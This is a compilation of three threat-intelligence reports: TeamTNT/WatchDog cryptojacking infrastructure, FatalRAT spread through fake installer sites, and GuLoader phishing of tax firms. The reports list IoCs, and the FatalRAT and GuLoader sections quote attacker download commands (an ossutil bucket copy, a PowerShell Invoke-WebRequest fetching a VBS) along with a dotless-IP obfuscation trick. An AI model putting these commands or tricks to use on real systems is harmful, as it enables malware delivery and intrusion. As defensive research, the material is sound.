The domain oracle.zzhreceive[.]top resolves to the IP address 199.19.226[.]117, which is also the resolution IP address for the known TeamTNT subdomain zzhrecieve.anondns[.]net. 
The usage of the anondns[.]net domain has been linked to several TeamTNT campaigns across multiple reports including, irc.anondns[.]net, ircbd.anondns[.]net, sampan.anondns[.]net and teamtntisback.anondns[.]net.
Additionally, the 199.19.226[.]117 system has also been linked to WatchDog operations through the toolkit file 1.0.4.tar.gz, 51de345f677f46595fc3bd747bfb61bc9ff130adcbec48f3401f8057c8702af9, which was hosted on hxxp://global.bitmex[.]com[.]de/cf67355a3333e6/1.0.4.tar.gz and contains C code for the masscan utility, which is the same toolkit used in the TeamTNT operations.
The bitmex[.]com[.]de URL had previously been linked to the WatchDog cryptojacking group. 
TeamTNT Malware Repository 
The malware repository 85.214.149[.]236:443/sugarcrm/themes/default/images/ contains known TeamTNT malware that includes the same files as the known TeamTNT repository hxxp://dockerupdate.anondns[.]net:443/sugarcrm/themes/default/images/, which is linked to TeamTNT via the malware sample 1aaf7bc48ff75e870db4fe6ec0b3ed9d99876d7e2fb3d5c4613cca92bbb95e1b, as shown in Figure 11. 
Figure 11.
Known TeamTNT malware repository.
Of note, some the of malware samples included in this repository were the Kubernetes and Docker-focused malware, ‘kube.jpg’ and ‘tshd’, presented in Unit 42's Black-T blog, but these appear to no longer be used in the new scripts discussed within this blog.
See the appendix for a full listing of the known TeamTNT malware metadata collected from the malware repository. 
The malware sample 0414946ab4bced2c1c41f4b8a75be672b34bbdee6f29e0a0bf7946b93f7044b1 is of note in this context as it contains the hardcoded IP address, 199.19.226[.]117, as well as the hardcoded Monero wallet address associated with the nanopool and f2pool mining pools, and the mining workers previously discussed (Figures 12 and 13).
As the previous section mentioned, the IP address 199.19.226[.]117 also resolves to the known TeamTNT domain zzhrecieve.anondns[.]net. Figure 12.
WatchDog directory using TeamTNT infrastructure.
Figure 13.
WatchDog Monero wallet address within TeamTNT infrastructure.
Finally, another TeamTNT malware repository was identified by Unit 42 researchers, as shown in Figure 14.
The larger Chimaera repository contains known TeamTNT cryptojacking scripts and binary files.
Within the spread/redis directory, the file b.sh, 3b14c84525f2e56fe3ae7dec09163a4a9c03f11e6a8d65b021c792ad13ed2701, was found, which directly links TeamTNT to the cryptojacking operations expressed in this report. 
Figure 14.
TeamTnT repository containing the b.sh script.
The b.sh script contains the 43xb TeamTNT and WatchDog Monero wallet address and points to the 199.19.226[.]117 TeamTNT and WatchDog IP addresses (Figure 15).
It also contains a hardcoded link to a known TeamTNT cloud enumeration script hosted on the known TeamTNT domain borg[.]wtf, see Figure 16. Figure 15.
TeamTNT and WatchDog XMR wallet and IP address.
Figure 16.
Known TeamTnT domain borg[.]wtf.
The borg[.]wtf domain was linked to TeamTNT via a previous Unit 42 report.
The correlations between TeamTNT and WatchDog are intrinsically connected with this b.sh script. 
Conclusion Considering the above evidence, it appears that WatchDog operations have incorporated the TTPs of the TeamTNT cryptojacking group and have significantly increased their own cryptojacking operations.
The new WatchDog operation does not appear to use the advanced functionalities TeamTNT has used recently, namely cloud credential scraping as well as targeted Kubernetes- and Docker-focused lateral movement and exploit scripts. 
It’s also noteworthy that the new operation does not incorporate the more advanced GoLang binaries traditionally associated with WatchDog, which are capable of exploiting Windows- or NIX-based operating systems. 
It appears that WatchDog actors are attempting to expand their cryptojacking operations, while simultaneously masking their operations with those of the known cryptojacking operations performed by TeamTNT.
Unit 42 researchers will continue to monitor this cryptojacking event and provide updates as needed. 
The following tips are highly recommended by Unit 42 researchers to assist in the protection of cloud infrastructure. 
Monitor and block network traffic to known malicious endpoints. 
Only deploy vetted container images within production environments. 
Implement and use Infrastructure as Code (IaC) scanning platforms to prevent insecure cloud instances from being deployed into production environments. 
Use cloud infrastructure configuration scanning tools that enable governance, risk management and compliance (GRC) to identify potentially threatening misconfigurations. 
Use cloud endpoint agents to monitor and prevent the running of known malicious applications within cloud infrastructure. 
Palo Alto Networks Prisma Cloud customers are protected from these threats through the Runtime Protection feature, Cryptominer Detection feature and the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives.
Additionally, Palo Alto Networks VM-Series and CN-Series products offer cloud protections that can prevent network connections from cloud instances toward known malicious IP addresses and URLs. Indicators of Compromise IP Addresses 103.125.218[.]10747.253.42[.]213176.123.10[.]5739.100.33[.]20945.9.150[.]36106.15.74[.]11345.9.148[.]3513.245.9[.]14785.214.149[.]23645.9.148[.]37199.19.226[.]117 URL Addresses 85.214.149[.]236:443/sugarcrm/themes/default/images/ hxxp://dockerupdate.anondns[.]net:443/sugarcrm/themes/default/images/ Domains global.bitmex.com[.]degsearch.com[.]dede.gsearch.com[.]deoracle.zzhreceive[.]topzzhreceive.anondns[.]netprojectbluebeam.anondns[.]net Monero (XMR) Wallets 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz Monero (XMR) Mining Pools xmr-asia1.nanopool[.]org:14444xmr.f2pool[.]com:13531Xmr.pool.gntl.co[.]uk:10009xmr.bohemianpool[.]com Repository SHA256 Hashes SHA256 FileName a506c6cf25de202e6b2bf60fe0236911a6ff8aa33f12a78edad9165ab0851caf kube.jpg e15550481e89dbd154b875ce50cc5af4b49f9ff7b837d9ac5b5594e5d63966a3 bioset.jpg 252bf8c685289759b90c1de6f9db345c2cfe62e6f8aad9a7f44dfb3c8508487a tshd.jpg 139f393594aabb20543543bd7d3192422b886f58e04a910637b41f14d0cad375 default.jpg 4f115381c17ba1dedb25d35d922feda9a723e206d811ed437b75fd8116ef461b 21.jpg 4a5d3435cd4a835056b4940e1cea9a25b1619562525bd9953a120b556b305983 
22.jpg feb0a0f5ffba9d7b7d6878a8890a6d67d3f8ef6106e4e88719a63c3351e46a06 mod.jpg 2c40b76408d59f906f60db97ea36503bfc59aed22a154f5d564d8449c300594f stock.jpg 9791ab0a00caf9de8df9eab1d8998d1b48bcc7c724b7d833cb1793cadc577e5f beta.jpg 72b1cbfbd87c6cd85b9dc1da48c852768003e7fb4f01d8f6904921474be199ad ms.jpg b5f6d6114e1ce863675df1bf2e4bfaeac243e22bb399e64b9a96c6d975330b28 mo2.jpg 88585888c4dd2450cc885fc8b75b555ea6f924c78581d5eeae5b54b4b6951ac5 b_armv7l ce5cd41711e74f11d8c01380194d9bb542da08733c81c317ec51089137330e0c blue.tmp.jpg 36bf7b2ab7968880ccc696927c03167b6056e73043fd97a33d2468383a5bafce mos.jpg 1aaf7bc48ff75e870db4fe6ec0b3ed9d99876d7e2fb3d5c4613cca92bbb95e1b nk.jpg 3ef459b97522a8e39953befa2e8c0e970bbbb0f7f9d3e1ff22b0f7759de04be1 b374k-master.zip c0ab7d1caabdd090b2399cd1193d2cc2334218d3f3f0d3164b61b6014fd308e9 mod.js 230e2a06df2cd7574ee15cb13714d77182f28d50f83a6ed58af39f1966177769 Carray.jpg b556d266b154c303bb90db005d7dd4267ed8d0e711e3fd32406c64b1fc977f9e local.jpg 78037e2d2e596bd450b99551535fa9c38c4e8346ab75eb424bf9e95316424fbe 01.jpg f3b53ebc7cb45c57854059be00ccde4c05cb1d66c4c5c55a93072b76f07a9c38 armv7l_xmrig.jpg ad1133cdcb486bab2368347b3ab35e83e5cd492c4bc6bfcb11a4b4c99d2c8014 xmrig-6.3.3-linux-static-x64.tar.gz bc02d0f9ec27f3c8d23c2f4647007e37a86fd404df0eef76c081fbb895f1be1b ktu.jpg 2a373d3e3e61999af09322b35356d26f95e183b1bb6222cae24d28b7b00ca01f flink.jpg bcfa215dec8fe15d4265c508c39c1ebafb7370acc95721e4e7d610b0459eb8dd jq.jpg b63efd9cca6a7379bc2a7e2b1ef721eedb0f3ac95afc14f2dd8db34f95688523 logs 79a060a0efcf4a1538c58e532b984dcd927fda17ca9fd10c2ff212f9d9d76be6 det.jpg b257a06a185f07e416f2b5ccc891fb799b82ce06bf1d4620d2439be65556c926 sok.js b485e6ccc9cfeb9c2034cebfeaf1bb3b3db0ac9996e5260fc1e95ce852b757c4 ssh.jpg Hashes Used in This Investigation 0414946ab4bced2c1c41f4b8a75be672b34bbdee6f29e0a0bf7946b93f7044b1 05963eaca329830c80a7fa2e9bea3b4ec2fe277f882f68be29befedb80d5738d 0910f78b68ccf1127a6a8f55d48b55c018149b4d5ab4a3fde56386a61c029ef4 10fb8d16f7d168340be28c6d0ba94e10c15370c8747d97bc0e5fad4b4466cf09 
22174c47cb1aa38ee0f5030597671b2436f1394f8229dc9708863e2e567576e6 2bc6c21d35ed63b135b4723444a9ac532e4cb6aaa2bbd63c557136edb4e4756f 30f0207b74d6d2d17cd8f4dc9f9131bd8763702f19c87ce74ea13a634f52c995 33da23085fb6fd7aad89e0c55b7ccbc2ee50fec4e8e31030e4b2a4ef034ac5f6 34b547b567309618422d7075322ddf5b9e0b3a4fb652f3845d12fd649f23923e 36ca9f84864ad022c255b7d91e75997f035716e4df5dc1c90ee2651f092f5d79 3b14c84525f2e56fe3ae7dec09163a4a9c03f11e6a8d65b021c792ad13ed2701 3b280a4017ef2c2aef4b3ed8bb47516b816166998462899935afb39b533890ad 3b53ed760142431ad45e550fd7a8d5c44ea4342619d9882909d8e3936283ec72 3d8a6f5d8162e8eb78e7b95384ec6418f65b904dffa8fd983a6a19a5645ad707 3e6cf5ae8ce6ff7305da4e218a20ec7f57933235ec07d7ff6e6a18c7c844ff29 428633aee75f7c69a7c0612e591d5fcecbcf13619d6c05b86c8303a248c7c8d7 466823948c92531a171a5ecb04339074cabd9d700ae67ea332f82cb3838490d2 49366ae4766492d94136ca1f715a37554aa6243686c66bf3c6fbb9da9cb2793d 62957aa4421c044927269e9bf3300515cf01225fd4c3c3811f8ebfac7a9f8585 64072e7c56895f59124c4e26e0dd65a4de0bd8280c83372c18f9835978cda0e9 7848fc64c9977796dcc0ee67c293f006d715d3b3e257a3c0f4654cefab637c45 7a8c91f4228be4d36e1087acc9bb046373ddfde506fe4645ad1b0967c08bfa8b 7b6f7c48256a8df2041e8726c3490ccb6987e1a76fee947e148ea68eee036889 8adc8be4b7fa2f536f4479fa770bf4024b26b6838f5e798c702e4a7a9c1a48c6 8d9bdcae4a4559e52b3d03209a1ef880e948d9f3969f7779119d9322c5f7cf7c ab73aedbee66081cd047b19a4bb036f85791a9ae9abc90545c5d8756bbc2a428 ae3e4a1c8a2b661265e6c8c756e3ba472dc7177cae79fe1861ab0c2d1af5167a ae6822d1fd097e8c52cea3731cd49f50600b7da83e9f0ea6dbc689685f907739 af611a41c55e9afcfaced8b067a470caa70825fce0a44167f44a8d3880ae6674 c141eaeab461a2481124a73ee2d254301573d8722dbf3221f5fc54d7770e67a2 c850fa9c2cdcf77dc0e7732785473db8881efe49935ddb7c6da9f3d1911a469f cbf54a9e5771fcb3760e4e282f003a879164e76b9df9fed0fe4e4e8aaaef11ae cf890e288f4fb7a2cfb0aa7e91229cc51c224e767c6ca69bbbb9d06e999ede64 e1d7014b84618cd7fbf94439c78fe7d67f351cbc5536885fa3d94ea15325d83b e47802d7f44fc9e594b89ef33298367d21695d5ec1ae5e6c526b9f3124c555ca eca42c42f0909cf4e6df6bf8de35ab93ef6a3dd10d0d5e556721ec1871a9990c f235c021baa6c8801e724d45003b1b1541eea5483810abc9c3eb4df6bf05afbf Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: These aren’t the apps you’re looking for: fake installers targeting Southeast and East Asia url: https://www.welivesecurity.com/2023/02/16/these-arent-apps-youre-looking-for-fake-installers/ ESET researchers have identified a campaign using trojanized installers to deliver the FatalRAT malware, distributed via malicious websites linked in ads that appear in Google search results ESET researchers identified a malware campaign that targets Chinese-speaking people in Southeast and East Asia by buying misleading advertisements to appear in Google search results that lead to downloading trojanized installers.
The unknown attackers created fake websites that look identical to those of popular applications such as Firefox, WhatsApp, or Telegram, but in addition to providing the legitimate software, also deliver FatalRAT, a remote access trojan that grants the attacker control of the victimized computer. 
Key points of the blogpost: The attackers purchased advertisements to position their malicious websites in the “sponsored” section of Google search results.
We reported these ads to Google and they were promptly removed. 
The websites and installers downloaded from them are mostly in Chinese and in some cases falsely offer Chinese language versions of software that is not available in China. 
We observed victims mostly in Southeast and East Asia, suggesting that the advertisements were targeting that region. 
We observed these attacks between August 2022 and January 2023, but according to our telemetry previous versions of the installers have been used since at least May 2022. 
None of the malware or network infrastructure used in this campaign has been matched to known activities of any named groups, so for now we have not attributed this activity to any known group. 
Victimology Figure 1 shows a heatmap with the countries where we detected the attacks between August 2022 and January 2023.
Most of the attacks affected users in Taiwan, China and Hong Kong. 
Figure 1.
Countries where we detected the attacks between August 2022 and January 2023 We also observed a small number of cases in: Malaysia Japan The Philippines Thailand Singapore Indonesia Myanmar Attack overview A simplified overview of the attack is shown in Figure 2.
A chain of multiple components ultimately installs the FatalRAT malware that was described by AT&T researchers (@attcyber) in August 2021. 
Figure 2.
Simplified overview of the attack Fake websites 
The attackers registered various domain names that all pointed to the same IP address: a server hosting multiple websites that download trojanized software.
Some of these websites look identical to their legitimate counterparts but deliver malicious installers instead.
The other websites, possibly translated by the attackers, offer Chinese language versions of software that is not available in China, such as Telegram, as shown in Figure 3. Figure 3.
Fake Telegram website that delivers the FatalRAT malware We observed malicious websites and installers for these applications, roughly in order of popularity: Chrome Firefox Telegram WhatsApp Line Signal Skype Electrum Bitcoin wallet Sogou Pinyin Method, a Chinese Pinyin input method editor Youdao, a dictionary and translation application WPS Office, a free office suite You can see other fake websites in the gallery shown in Figure 4 (click on an image to enlarge it).
Apart from electrumx[.]org, a fake website in English for the Electrum Bitcoin wallet, all the other websites are in Chinese, suggesting that the attackers are mostly targeting Chinese speakers. 
Figure 4.
Fake websites created by the attackers to deliver malicious installers (click to enlarge) 
While in theory there are many possible ways that potential victims can be directed to these fake websites, a news site reported (English version here) that they were being shown an advertisement that led to one of these malicious websites when searching for the Firefox browser in Google.
We couldn’t reproduce such search results, but believe that the ads were only served to users in the targeted region.
An example is shown in Figure 5 (image from the original post above).
We reported the websites to Google and the ads were taken down. 
Figure 5.
Search results for Firefox, with a fake website advertised (image credit: landiannews.com) 
Given the fact that many of the domain names that the attackers registered for their websites are very similar to the legitimate domains, it is also possible that the attackers rely on typosquatting as well to attract potential victims to their websites.
Some examples are: You’ll find the rest of the domain names that we observed in the IoCs section. 
Installers The installers downloaded from the fake websites are not hosted on the same server as the websites, but in the Alibaba Cloud Object Storage Service.
They are digitally signed MSI files (see the Certificates section) created with Advanced Installer.
Figure 6 shows the malicious installers that the attackers uploaded to the cloud storage on January 6th, 2023. 
Figure 6.
Malicious installers uploaded by the attackers to their cloud storage on January 6th, 2023 When these installers are executed, they usually: Drop and execute the malicious loader, and files needed to run the FatalRAT malware, in the %PROGRAMDATA%\Progtmy directory. 
Drop the malicious updater and related files in the %PROGRAMDATA%\Progtmy\0 directory. 
Drop a file named ossutilconfig in the %USERPROFILE% directory.
This file contains credentials used by the updater to connect to a remote bucket in the Alibaba Cloud. 
Create an empty directory %
PROGRAMDATA%\Progptp (although we observed some cases where the FatalRAT malware was installed in this directory instead). 
Drop and execute the legitimate installer in C:\Program Files\Common Files (see CommonFiles64Folder). 
Create scheduled tasks to execute the loader and updater components. 
The malware is run by side-loading a malicious DLL, libpng13.dll, which is used by sccs.exe (Browser Support Module), a legitimate executable developed by Xunlei.
The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.
Some of the forwarded exports in the malicious DLL are shown in Figure 7.
The image shows that the original DLL was renamed to BHuedjhd.dll in this example and that the malicious DLL was compiled as Dll22.dll. 
Figure 7.
Part of the exported functions in the malicious DLL that are forwarded to the original The malware updater is executed in a similar manner, by side-loading dr.dll, used by a legitimate, signed binary developed by Tencent.
The malicious DLL is very simple and executes OSSUTIL (included in the installer package as ssu.exe) to download files from an attacker-controlled bucket in Alibaba Cloud.
The command executed by the DLL is: cmd /C
“C:\ProgramData\Progtmy\2\ssu.exe cp -r oss://occ-a1/dll/3/ C:\ProgramData\Progtmy\ –update” This should update files in the %PROGRAMDATA%\Progtmy local directory from the remote bucket occ-a1 (a different bucket than the ones used to store the installers, but in the same account), but it doesn’t work in any of the installers that we analyzed because the %PROGRAMDATA%\Progtmy\2 subdirectory doesn’t exist (it should be subdirectory 0, created by the installer). 
The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn’t exist.
In most cases, four scheduled tasks are created: two for the RAT (one set to execute periodically and the other whenever any user logs into the PC) and two for the updater.
The names of the tasks are based in the Windows build number and the name of the computer, as shown in Figure 8. Figure 8.
Scheduled tasks created by the malicious installers Loaders The loader – libpng13.dll – is a very simple component that opens and executes in memory a file named Micr.jpg, located in the same directory as the DLL.
The attackers have obfuscated the loader with many calls to a function that just prints some hardcoded values.
It’s possible that this behavior was used to avoid being detected by security solutions or to complicate the analysis of the DLL. 
Figure 9 shows an example of the obfuscated code on the left and the deobfuscated code on the right. 
Figure 9.
Part of the decompiled code for libpng13.dll on the left and on the right the same code deobfuscated Micr.jpg is actually shellcode that also contains an embedded DLL.
The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.
Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.
This encrypted payload is the FatalRAT malware, and after its decryption the DLL will find the address of an export function called SVP7, which contains the entry point of the malware, and call it, passing the encrypted configuration of FatalRAT as an argument. 
The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.
An example of this function is shown in Figure 10. 
FatalRAT FatalRAT is a remote access trojan documented in August 2021, by AT&T Alien Labs.
This malware provides a set of functionalities to perform various malicious activities on a victim’s computer.
As an example, the malware can: Capture keystrokes Change the victim’s screen resolution Terminate browser processes and steal or delete their stored data.
The targeted browsers are: Chrome Firefox QQBrowser Sogou Explorer Download and execute a file Execute shell commands This malware contains various checks to determine whether it’s running in a virtualized environment.
Depending on its configuration, these checks may be executed or not. 
From our own analysis we were able to determine that the FatalRAT version used in this campaign is very similar to the one documented by AT&T in their blogpost, so we won’t go into more details.
A comparison of them is shown in Figure 11, and Figure 10 shows the decompiled code used to decrypt strings in the FatalRAT samples from this campaign, which is the same as the one described by AT&T. Figure 10.
Decompiled code of a function used by a FatalRAT sample to decrypt its configuration strings Figure 11.
BinDiff comparison between a FatalRAT sample analyzed by AT&T and the FatalRAT sample found in this campaign Previous version We found a previous version of the malicious installer that the attackers have used since at least May 2022.
Unlike the installers that we described previously, this version contains an XOR-encrypted payload, divided into three files: Micr.flv, Micr2.flv, and Micr3.flv, each file encrypted with a different, single byte XOR key.
Once decrypted, the content of the three files is concatenated, forming shellcode that contacts a C&C server to download and execute further shellcode. 
The loader DLL in this case is named dr.dll – the same name that is used for the update mechanism in later versions of the installer, side-loaded by the same legitimate executable.
Given that this older version doesn’t seem to have an updater, we believe that the attackers have replaced it with the new version of the installer since August 2022. 
Twitter user Jirehlov Solace reported other versions of the installers starting in May 2022, as can be seen in this thread.
Although some of those installers are the same as ones in this report, it seems that most of them are different, compiled as EXE files (not MSI installers) and using a variety of software packers.
Those samples are probably connected with Operation Dragon Breath as described by Qi An Xin in May 2022. 
Conclusion The attackers have expended some effort regarding the domain names used for their websites, trying to be as similar to the official names as possible.
The fake websites are, in most cases, identical copies of the legitimate sites.
As for the trojanized installers, they install the actual application that the user was interested in, avoiding suspicion of a possible compromise on the victim’s machine.
For all of these reasons, we see how important it is to diligently check the URL that we are visiting before we download software.
Even better, type it into your browser’s address bar after checking that it is the actual vendor site. 
Since the malware used is this campaign, FatalRAT, contains various commands used to manipulate data from different browsers, and the victimology is not focused on a particular type of user, anyone can be affected.
It is possible that the attackers are solely interested in the theft of information like web credentials to sell them on underground forums or to use them for another type of crimeware campaign, but for now specific attribution of this campaign to a known or new threat actor is not possible. 
ESET Research offers private APT intelligence reports and data feeds.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
IoCs Files SHA-1FilenameESET detection nameDescription 00FD2783BBFA313A41A1A96F708BC1A4BB9EACBDChrome-Setup.msiWin32/Agent.
AFAHMalicious MSI installer. 
3DAC2A16F023F9F8C7F8C40937EE54BBA5E82F47Firefox-x64.msiWin32/Agent.
51D29B025A0D4C5CDC799689462FAE53765C02A3LINE-Setup.msiWin32/Agent.
64C60F503662EF6FF13CC60AB516D33643668449Signal-Setup.msiWin32/Agent.
2172812BE94BFBB5D11B43A8BF53F8D3AE323636Skype-x64.msiWin32/Agent.
3620B83C0F2899B85DC0607EFDEC3643BCA2441DSogou-setup.msiWin32/Agent.
1FBE34ABD5BE9826FD5798C77FADCAC170F46C07Whats-64.msiWin32/Agent.
23F8FA0E08FB771545CD842AFDE6604462C2B7E3Whats-Setup.msiWin32/Agent.
C9970ACED030AE08FA0EE5D9EE70A392C812FB1BWhatsApp-中文.msi (machine translation: Chinese)Win32/Agent.
AFAHMalicious MSI installer. 76249D1EF650FA95E73758DD334D7B51BD40A2E6WPS-SetuWhatsApp-中文p.msi (machine translation: Chinese)Win32/Agent.
DBE21B19C484645000F4AEE558E5546880886DC0电报-中文版.msi (machine translation: Telegram - Chinese Version)Win32/Agent.
1BE646816C8543855A96460D437CCF60ED4D31FE电报中文-64.msi (machine translation: Telegram Chinese)Win32/Agent.
B6F068F73A8F8F3F2DA1C55277E098B98F7963EC电报中文-setup.msi (machine translation: Telegram Chinese)Win32/Agent.
AFAHMalicious MSI installer.
 2A8297247184C0877E75C77826B40CD2A97A18A7windows-x64中文.exe (machine translation: Chinese)Win32/ShellcodeRunner.
BRMalicious installer (older version). 
ADC4EB1EDAC5A53A37CC8CC90B11824263355687libpng13.dllWin32/Agent.
AFAHLoader DLL. 
EF0BB8490AC43BF8CF7BBA86B137B0D29BEE61FAdr.dllWin32/Agent.
AFAHUpdater DLL. 
AD4513B8349209717A351E1A18AB9FD3E35165A3dr.dllWin32/ShellcodeRunner.
BRLoader DLL. 
Network IPProviderFirst seenDetails 107.148.35[.]6PEG TECH INC2022-10-15Server hosting malicious websites.firefoxs[.]org googlechromes[.]com youedao[.]com telegramxe[.]com telegramxe[.]net telegramsz[.]net whatcpp[.]com whatcpp[.]net whatsappt[.]org telegraem[.]org telegraxm[.]net skype-cn[.]org electrumx[.]org line-cn[.]net whateapp[.]net whatcapp[.]org 107.148.45[.]20PEG TECH INC2022-12-1912-03.telegramxe[.]com; C&C server. 
107.148.45[.]32PEG TECH INC2023-01-0412-25.telegraem[.]org; C&C server. 
107.148.45[.]34PEG TECH INC2023-01-0612-25.telegraxm[.]org; C&C server. 
107.148.45[.]37PEG TECH INC2022-12-1012-08.telegraem[.]org; C&C server. 
107.148.45[.]48PEG TECH INC2022-12-2212-16.pinyin-sougou[.]com; C&C server. 
193.203.214[.]75Yuhonet
International Limited2022-06-16ghg.telegream[.]online; C&C server. 
Certificates Serial number26483C52A9B6A99A4FB18F69F8E575CE Thumbprint505CF4147DD08CA6A7BF3DFAE9590AC62B039F6E Subject CNTeCert Subject ON/A Subject LN/A Subject SN/A Subject CN/A Valid from2022-12-16 11:46:19 Valid to2023-12-16 12:06:19 Serial number317984D3F2ACDAB84095C93874BD10A9 Thumbprint457FC3F0CEC55DAAE551014CF87D2294C3EADDB1 Subject CNTelegram_Inc Subject ON/A Subject LN/A Subject SN/A Subject CN/A Valid from2022-06-02 11:10:49 Valid to2023-06-02 11:30:49 MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework. 
TacticIDNameDescription Resource DevelopmentT1583.001Acquire Infrastructure:
DomainsThe attackers acquired domain names for their malicious websites and C&C servers. 
T1583.003Acquire Infrastructure : Virtual Private ServerThe attackers acquired VPS servers to store their malicious websites. 
T1585.003Establish Accounts: Cloud AccountsThe attackers acquired accounts in Alibaba Cloud Object Storage Service to host their malicious MSI installers. 
T1608.001Stage Capabilities: Upload MalwareThe attackers uploaded their malicious MSI files to Alibaba Cloud Object Storage Service. 
T1587.002Develop Capabilities: Code Signing CertificatesThe attackers used self-signed certificates to sign their malicious MSI Installers. 
Initial AccessT1189Drive-by CompromiseThe attackers used Google Ads to direct their victims to their malicious websites. 
ExecutionT1204.002User
Execution: Malicious FileThe attackers have relied on their victims to execute the malicious MSI installers. 
T1059.003Command and Scripting Interpreter:
Windows Command ShellThe malware updater uses cmd.exe to download files from Alibaba Cloud Object Storage Service. 
T1106Native
APIThe loaders use API calls such as VirtualAlloc to load and execute malicious components into memory. 
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskThe MSI installers create scheduled tasks to achieve persistence. 
T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderFatalRAT creates a registry Run key to achieve persistence. 
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe loaders and FatalRAT component use various encryption algorithms to hide payloads and strings. 
T1027.007Obfuscated Files or Information:
Dynamic API ResolutionThe loaders use dynamic API resolution to avoid detection. 
T1574.002Hijack Execution Flow: DLL Side-LoadingThe attackers have used DLL side-loading to execute their malicious payloads. 
T1497.001Virtualization/Sandbox Evasion: System ChecksFatalRAT performs various checks to detect whether it’s running on a virtual machine. 
T1027.009Obfuscated Files or Information:
Embedded PayloadsThe Micr.jpg file contains shellcode and an embedded DLL file that loads FatalRAT. 
T1553.002Subvert Trust Controls: Code SigningThe attackers have used self-signed certificates to sign their malicious MSI files. 
CollectionT1056.001Input Capture: KeyloggingFatalRAT has keylogger functionalities. 
T1119Automated CollectionFatalRAT automatically collects information from a compromised machine and sends it to the C&C server. Command and ControlT1573.001Encrypted Channel:
Symmetric CryptographyFatalRAT encrypts data with a custom encryption algorithm before it is sent to the C&C server. 
T1095Non-Application Layer ProtocolFatalRAT uses TCP for C&C communications. 
ExfiltrationT1020Automated ExfiltrationFatalRAT automatically sends information from a compromised machine to its C&C. T1041Exfiltration Over C2 ChannelFatalRAT exfiltrates data over the same channel used for C&C. 16 Feb 2023 - 11:30AM 
title: Tax firms targeted by precision malware attacks url: https://news.sophos.com/en-us/2023/04/13/tax-firms-targeted-by-precision-malware-attacks/ Financial accountant firms and CPAs are in the crosshairs this tax season, as a threat actor is targeting that industry with an attack that combines social engineering with a novel exploit against Windows computers to deliver malware called GuLoader. 
At least two organizations in that industry, both Sophos customers, reported the unusual attack to us in late February and early March, as tax preparers are entering the busiest part of the season in the United States.
(The tax filing deadline this year is April 17, 2023.) 
The attack begins with an email that purports to solicit business from the tax preparation firm.
The initial message to the target is benign, with a subject line of Prospective Client Enquiries containing nothing more than an introduction and a request for information about “onboarding new clients.” 
The email sender goes on to claim that “The CPA I used last year is retired, so here I am on the lookout for a new firm to work with.” 
Responding to the hook with a bigger hook If the target responds to this initial solicitation, the sender then sends a follow-up email with a link to a password-protected Zip file hosted on a cloud storage service.
The Zip archive has a filename that includes the last name of the fictitious person whose purportedly sent the initial email message. 
In each of the messages we saw targeting different accounting firms, the attacker used different names, such as Rodney Williamson or Sarah Knapp. 
The fake sender used the same password of Fresh@123 for the Zip archive in the samples we obtained.
Because the attacker only sends the link to a CPA who responds to the initial email message, very few of them were caught in spam traps.
The samples we obtained had been submitted to us only after the targets realized they were being attacked. 
The sender was very conversational and personable in the messages, helpfully offering that the Zip archive contains “in addition to my tax transcripts for the past two years…a copy of my driver’s license.”
The attacker also asks the target “Would you be available for a quick telephone call on Friday?”
Whoever crafted the messages has a good grasp of English-language euphemisms and tax-filing vernacular.
These messages, with a few very minor spelling or grammar errors, were very hard to discern from ones that might be sent by a legitimate, prospective client of a tax firm. 
Infection process based on deception 
If the first stage of the process involves convincing the accounting professional to download and open the linked Zip archive, the next phase is completely out of the tax preparer’s control. 
The Zip archive contains two files: A Windows Shortcut (a .LNK file), and a benign decoy attachment.
In the examples we received, one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf. 
Both of these files were the same three minute long MP3 audio recording – a file that sounds like someone playing an Oud, the stringed instrument similar to a lute used widely in the middle east. 
When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn’t the type of file it appears to be.
Adobe Reader or a photo viewing program can’t open the file. 
The target would then, naturally, double click the other file in the Zip archive — a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document. 
Unusually, the Windows shortcut has been manipulated in such a way that Windows seems to think that it is a VBScript Script File in the shortcut’s properties sheet. 
The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.
The attackers have crafted the shortcut, by prepending a large number of space characters to the Target field in the properties, so that the Target field appears blank. 
However, when viewed using a hex editor, the text content of the shortcut is rendered visible.
It contains a PowerShell command that looks like the following: Invoke-WebRequest http://0x[two hex bytes].[eight digits]/fresh/fordl.vbs -OutFile
C:\Windows\Tasks\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.
A second command appended to the first drops an actual PDF document (of someone’s IRS form W-2, 1099, or 1040) into the same location and opens it as well, as a decoy. 
The crafting of the URL was somewhat unique.
The attacker seems to have made a mashup of two different formats of so-called “dotless” IP address (an unusual combo of the hex and “dword” types of dotless IPs) into a combination that isn’t human-readable, but that networked applications like PowerShell can understand and interpret as valid IPv4 addresses. 
The script shown above uses the address 0xC2.11808979 in the URL, which translates to the IPv4 address 194.180.48.211.
We also discovered scripts that pointed to malicious files hosted on the addresses 0x6D.13561923 (109.206.240.67) and 0x05.526436 (5.8.8.100). 
All of the servers hosting the malware hosted them inside of open directories.
